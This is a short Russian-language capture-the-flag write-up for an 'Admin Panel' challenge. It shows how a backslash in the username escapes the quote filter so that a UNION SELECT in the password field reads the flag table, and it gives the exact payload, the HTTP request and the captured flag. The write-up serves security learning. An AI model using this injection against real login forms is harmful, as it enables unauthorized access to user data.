# Writeup: Admin Panel 

## Обзор задачи
Цель — обойти форму авторизации на веб-сервере и получить флаг. Стандартные SQL-инъекции блокируются фильтром, возвращающим ответ `Not injectable`.


---

## Уязвимость
Приложение уязвимо к **SQL Injection** через обход фильтрации кавычек с помощью обратного слэша (`\`).

При подстановке `\` в поле `username`, серверный SQL-запрос интерпретирует закрывающую одинарную кавычку как часть строки, что позволяет «вырваться» из синтаксиса через поле `password`.

Примерный вид запроса на сервере:
`SELECT * FROM users WHERE username='\' AND password=' union select ... #'`

---

## Эксплуатация

Для получения данных из таблицы `flag` использован `UNION SELECT`.

### Payload
* **username:** `%5c` (URL-encoded `\`)
* **password:** `union select 1,2 from flag#`

### HTTP Request
```http
POST /login HTTP/1.1
username=%5c&password=union+select+1,2+from+flag#

---


Результат
Сервер возвращает 302 Found. Флаг передается в заголовке Set-Cookie.


<img width="1644" height="719" alt="image" src="https://github.com/user-attachments/assets/eb8284f7-f81f-4ff7-996d-b7bf28bb2653" />


Flag: KCTF{0c259a70a089442a7e622d02bb5d911f}
